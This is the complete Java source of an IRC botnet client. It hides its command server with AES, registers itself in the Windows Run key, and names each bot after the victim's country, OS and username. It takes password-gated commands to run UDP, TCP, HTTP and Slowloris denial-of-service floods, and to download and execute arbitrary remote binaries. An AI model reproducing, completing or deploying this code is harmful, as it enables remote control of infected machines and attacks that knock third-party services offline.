
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 *
 * @author Kenta Iwasaki & Kuushie
 */
public class Client {
    public static Client instance;
    private String ircServer = "633cae5b6c27b7b1c7ec8d3d9538981b4ef4fd33937d18bf531accb869bdbe15";
    private String ircChannel = "d3f1c529ef9bc533e41e5e3f81d4bd56";
    private String ircChannelPass = "";
    private String ircNick = "";
    private String botNumber;
    private int ircPort = 6667;
    private Socket ircSocket;
    private PrintWriter out;
    private BufferedReader in;

    private String ircServerCache;
    private String ircChannelCache;

    private String botPacket;
    private int botPacketSize = 65000;
    private String botPassword = "12341234";
    
    private boolean botSilent = false;
    private String botTempDir = System.getProperty("java.io.tmpdir");
    private String botTempFileName;
    private double botVersion = 0.03;
    
    private String osName = System.getProperty("os.name");
    private String country = System.getProperty("user.country").toUpperCase();
    private String username = System.getProperty("user.name");

    public Client() {
        try {
            ircServerCache = decrypt(ircServer);
            ircChannelCache = decrypt(ircChannel);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Client getInstance() {
        if (instance == null) {
            instance = new Client();
        }
        return instance;
    }

    public static void main(String[] args) throws Exception {
        if (getInstance().multipleInstancesExist()) {
            System.exit(0);
        }
        getInstance().start();
        while (true) {
            if (!new File(System.getProperty("user.home")+"\\" + "\\jupdate.jar").exists()) {
                getInstance().copyFile(instance.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().toString().replace("file:/", ""), System.getProperty("user.home")+"\\jupdate.jar");
            }
            if (!getInstance().isRunning("javaw.exe")) {
               getInstance().executeBot();
            }
            try {
                Thread.sleep(5000); // Sleep for 5 seconds to prevent lag
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
    }

    public String getPacket() {
        return botPacket;
    }

    private boolean multipleInstancesExist() {
        try {
            new ServerSocket(5678);
            return false;
        } catch (IOException ioe) {
            return true;
        }
    }

    private void start() throws Exception {
        botPacket = "";
        for (int i = 0; i < botPacketSize; i++) {
            botPacket += "A";
        }
        if (!botTempDir.endsWith(System.getProperty("file.separator"))) {
            botTempDir = botTempDir + System.getProperty("file.separator");
        }
        botTempFileName = botTempDir + "test.exe";
        if (osName.startsWith("Windows")) {
            createStartup();
        }
        while (true) {
            try {
                connect();
                String response = "";
                while ((response = in.readLine()) != null) {
                    System.out.println(response);
                    parseResponse(response);
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
            System.out.print("Disconnected: reconnecting in 5 seconds..");
            Thread.sleep(5000);
        }
    }

    public void executeBot() {
        try {
            Runtime.getRuntime().exec(System.getProperty("user.home")+"\\" + "\\jloader.jar");
            RegistryUtils.writeStringValue(RegistryUtils.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Scheduled Loader", "\"" + System.getProperty("user.home") + "\\jloader.jar" + "\"");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public boolean isRunning(String process) {
        boolean found = false;
        try {
            File file = File.createTempFile("process_check", ".vbs");
            file.deleteOnExit();
            FileWriter fw = new java.io.FileWriter(file);

            String vbs = "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n"
                    + "Set locator = CreateObject(\"WbemScripting.SWbemLocator\")\n"
                    + "Set service = locator.ConnectServer()\n"
                    + "Set processes = service.ExecQuery _\n"
                    + " (\"select * from Win32_Process where name='" + process + "'\")\n"
                    + "For Each process in processes\n"
                    + "wscript.echo process.Name \n"
                    + "Next\n"
                    + "Set WSHShell = Nothing\n";

            fw.write(vbs);
            fw.close();
            Process p = Runtime.getRuntime().exec("cscript //NoLogo " + file.getPath());
            BufferedReader input =
                    new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            line = input.readLine();
            if (line != null) {
                if (line.equals(process)) {
                    found = true;
                }
            }
            input.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return found;
    }

    private void connect() throws Exception {
        ircSocket = new Socket(ircServerCache, ircPort);
        out = new PrintWriter(ircSocket.getOutputStream(), true);
        in = new BufferedReader(new InputStreamReader(ircSocket.getInputStream()));
        if (osName.contains("7"))
            osName = "W7";
        else if (osName.contains("Vista"))
            osName = "WVIS";
        else if (osName.contains("XP"))
            osName = "WXP";
        else if (osName.contains("98"))
            osName = "WNT";
        else if (osName.contains("Linux"))
            osName = "LNX";
        else if (osName.contains("Unix"))
            osName = "UNX";
        else if (osName.contains("Mac"))
            osName = "MAC";
        botNumber = Integer.toString((int) ((Math.random() * 9999) + 1));
        ircNick = "{" + country + "|" + osName + "|" + "" + username + "|" + botNumber + "}";

        out.println("NICK " + ircNick);
        out.println("USER " + ircNick + " 8 * :" + ircNick);
        out.println("JOIN " + ircChannelCache + " " + ircChannelPass);
    }

    private void sendMessage(String message) throws Exception {
        if (!botSilent) {
            out.println("PRIVMSG " + decrypt(ircChannel) + " :" + message);
        }
    }

    private void parseResponse(String response) throws Exception {
        if (response.split(" ")[0].equals("PING")) {
            out.println("PONG " + response.substring(5));
            System.out.println("PONG " + response.substring(5));
            return;
        }

        try {
            if (!response.split("@")[1].substring(0, botPassword.length()).equals(botPassword)) {
                return;
            }
        } catch (Exception e) {
        }
        String resolvedResponse = "";
        for (int i = 2; i < response.split(":").length; i++) {
            resolvedResponse += response.split(":")[i];
            if (!((i + 1) == response.split(":").length)) {
                resolvedResponse += ":";
            }
        }
        response = resolvedResponse;
        String[] command = response.split(" ");
        if (command[0].contains(".")) {
            if (command[0].equals(".udpflood") && command.length == 3) {
                floodUDP(command[1], Long.valueOf(command[2]));
            } else if (command[0].equals(".tcpflood") && command.length == 5) {
                floodTCP(command[1], Integer.decode(command[2]), Integer.decode(command[3]), Long.valueOf(command[4]));
            } else if (command[0].equals(".httpflood") && command.length == 2) {
                floodHTTP(command[1], Long.valueOf(command[2]));
            } else if (command[0].equals(".update") && command.length == 2) {
                download(true, new URL(command[1]));
            } else if (command[0].equals(".download") && command.length == 2) {
                download(false, new URL(command[1]));
            } else if (command[0].equals(".echo") && command.length >= 2) {
                sendMessage(response.substring(6));
            } else if (command[0].equals(".die") && command.length == 2) {
                if (botNumber.equals(command[1]) || command[1].equals("all")) {
                    try {
                        RegistryUtils.deleteValue(RegistryUtils.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Scheduled Updater");
                    } catch (Exception e) {
                    }
                    sendMessage("Bye!");
                    System.exit(0);
                }
            } else if (command[0].equals(".version")) {
                sendMessage(Double.toString(botVersion));
            } else if (command[0].equals(".visit") && command.length == 2) {
                visit(new URL(command[1]));
            } else if (command[0].equals(".slowloris") && command.length == 4) {
                floodSlowloris(command[1], Integer.decode(command[2]), Integer.decode(command[3]));
            } else if (command[0].equals(".silent")) {
                if (command.length == 2) {
                    if (Integer.parseInt(command[1]) == 0) {
                        sendMessage("Bot can now talk");
                        botSilent = false;
                    } else if (Integer.parseInt(command[1]) == 1) {
                        sendMessage("Bot is now silent");
                        botSilent = true;
                    }
                } else {
                    sendMessage("Bot is silent? " + botSilent);
                }
            }
        }
    }
    
    private void floodSlowloris(String host, final int threads, final int delayz) throws Exception {
        final String target = resolve(host);
        sendMessage("Slowloris attack on " + target + " (using " + threads + " threads each)..");
        for (int i = 0; i < threads; i++) {
            new Thread(new Runnable() {
                public void run() {
                    try {
                        Socket socket = new Socket(target, 80);
                        PrintWriter out = new PrintWriter(socket.getOutputStream());
                        out.println("GET / HTTP/1.1");
                        out.println("Host: " + target + "");
                        out.println("User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)");
                        out.println("Content-Length: 42");
                        int iterations = 0;
                        while (true) {
                            if ((iterations * 1000) >= (delayz * 1000)) {
                                break;
                            }
                            out.println("X-a: b");
                            Thread.sleep(1000);
                            iterations += 1;
                        }
                        out.close();
                        socket.close();
                        out = null;
                        socket = null;
                    } catch (Exception e) {
                    }
                }
            }).start();
        }
    }

    private void floodUDP(String host, final long duration) throws Exception {
        final String target = resolve(host);
        sendMessage("UDP flood attack on " + target + "..");
        new Thread(new Runnable() {

            public void run() {
                try {
                    long endTime = System.currentTimeMillis() + duration;
                    DatagramSocket udpSocket = new DatagramSocket();
                    while (System.currentTimeMillis() < endTime) {
                        byte[] data = new byte[65000];
                        data = Client.getInstance().getPacket().getBytes();
                        try {
                            udpSocket.send(new DatagramPacket(data, data.length, InetAddress.getByName(target), (int) (Math.random() * 65534) + 1));
                        } catch (IOException ioe) {
                        }
                    }
                    udpSocket.close();
                } catch (SocketException se) {
                }
            }
        }).start();
    }

    private void floodTCP(String host, final int port, int thread, final long duration) throws Exception {
        final String target = resolve(host);
        sendMessage("TCP flood attack on " + target + "..");
        for (int i = 0; i < thread; i++) {
            new Thread(new Runnable() {

                public void run() {
                    try {
                        long endTime = System.currentTimeMillis() + duration;
                        while (System.currentTimeMillis() < endTime) {
                            new Socket(target, port); // Just checked an example for it, just open a socket rofl.
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }

    private void floodHTTP(String host, final long duration) throws Exception {
        final String target = resolve(host);
        sendMessage("HTTP flood attack on " + target + "..");
        new Thread(new Runnable() {
            public void run() {
                long endTime = System.currentTimeMillis() + duration;
                while (System.currentTimeMillis() < endTime) {
                    try {
                        HttpURLConnection conn = (HttpURLConnection) new URL(target).openConnection();
                        conn.setRequestMethod("GET");
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }
        }).start();
    }

    private void download(boolean update, URL downloadURL) throws Exception {
        sendMessage("Downloading: " + botTempFileName);
        BufferedInputStream bis = new BufferedInputStream(downloadURL.openStream());
        FileOutputStream fos = new FileOutputStream(botTempFileName);
        BufferedOutputStream bos = new BufferedOutputStream(fos, 1024);
        byte[] arrayOfByte = new byte[1024];
        int i = 0;
        while ((i = bis.read(arrayOfByte, 0, 1024)) >= 0) {
            bos.write(arrayOfByte, 0, i);
        }
        bis.close();
        bos.close();
        if (update) {
            Runtime.getRuntime().exec(botTempFileName);
            ircSocket.close();
            System.exit(0);
        } else {
            Runtime.getRuntime().exec(botTempFileName);
        }
    }

    private void visit(final URL url) throws Exception {
        sendMessage("Visiting " + url.toString());
        new Thread(new Runnable() {
            public void run() {
                try {
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setDoOutput(true);
                    conn.setReadTimeout(500);
                    conn.connect();
                    conn.getInputStream();
                    conn = null;
                } catch (MalformedURLException murle) {
                    murle.printStackTrace();
                } catch (IOException ioe) {
                    ioe.printStackTrace();
                }
            }
        }).start();
    }

    private void createStartup() {
        try { //JUpdate is the file name! Dont make it dynamic towards the original bots name or the loader will be too hard to develop!
            RegistryUtils.writeStringValue(RegistryUtils.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Scheduled Updater", "\"" + System.getProperty("user.home") + "\\jupdate.jar" + "\"");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void copyFile(String srFile, String dtFile) {
        try {
            File f1 = new File(srFile);
            File f2 = new File(dtFile);
            InputStream inz = new FileInputStream(f1);
            OutputStream outz = new FileOutputStream(f2);
            byte[] buf = new byte[1024];
            int len;
            while ((len = inz.read(buf)) > 0) {
                outz.write(buf, 0, len);
            }
            inz.close();
            outz.close();
        } catch (Exception e) {
        }
    }

    //Had to find code snippets for this one.
    private String decrypt(String encryptedHex) throws Exception {
        String iv = "572a2f6b72462a5d";
        String key = "7a504a475d452b5e";
        IvParameterSpec ivspec;
        KeyGenerator keygen;
        SecretKeySpec keyspec;

        ivspec = new IvParameterSpec(iv.getBytes());

        keygen = KeyGenerator.getInstance("AES");
        keygen.init(128);

        keyspec = new SecretKeySpec(key.getBytes(), "AES");

        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");

        byte[] decrypted;
        cipher.init(Cipher.DECRYPT_MODE, keyspec, ivspec);
        decrypted = cipher.doFinal(hexToBytes(encryptedHex.toCharArray()));

        return new String(decrypted).trim();
    }

    private static byte[] hexToBytes(char[] hex) {
        int length = hex.length / 2;
        byte[] raw = new byte[length];
        for (int i = 0; i < length; i++) {
            int high = Character.digit(hex[i * 2], 16);
            int low = Character.digit(hex[i * 2 + 1], 16);
            int value = (high << 4) | low;
            if (value > 127) value -= 256;
            raw[i] = (byte) value;
        }
        return raw;
    }

    private String resolve(String host) throws Exception {
        URL url = null;
        if (host.contains("http://")) {
            url = new URL(host);
        } else {
            url = new URL("http://" + host);
        }
        return InetAddress.getByName(url.getHost()).getHostAddress();
    }
}
